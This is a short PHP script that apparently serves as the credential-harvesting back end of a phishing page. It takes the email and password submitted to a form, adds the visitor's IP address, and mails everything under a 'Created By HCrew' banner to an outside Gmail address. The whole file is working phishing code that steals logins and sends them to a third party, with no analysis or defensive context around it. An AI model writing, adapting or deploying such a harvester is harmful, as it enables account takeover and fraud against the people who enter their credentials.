<?

$mailfrom = "ALL <source@wetlandexpress.com>";
$ip = getenv("REMOTE_ADDR");
$message .= "-----------------Logs------------------\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "-------------Created By HCrew-----------\n";

$recipient = "meldplanetltd@gmail.com";
$subject = "All Logs";
$headers = "From:$mailfrom\n";
$headers .= "MIME-Version: 1.0\n";

mail($recipient,$subject,$message,$headers);

?>